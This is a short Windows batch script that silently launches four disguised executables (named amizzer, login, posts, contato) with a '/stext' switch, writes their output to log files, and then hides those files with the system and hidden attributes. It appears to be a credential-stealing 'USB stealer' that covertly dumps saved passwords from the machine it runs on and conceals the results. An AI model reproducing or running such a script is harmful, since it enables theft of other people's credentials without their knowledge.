@echo off
start /min Amizzer-me\data\amizzer.exe /stext Amizzer-me/log.els
start /min Amizzer-me\data\login.exe /stext Amizzer-me/log2.els
start /min Amizzer-me\data\posts.exe /stext Amizzer-me/log3.els
start /min Amizzer-me\data\contato.exe /stext Amizzer-me/log4.els
attrib Amizzer-me\*.els +s +h
attrib Amizzer-me\log3.els +s +h



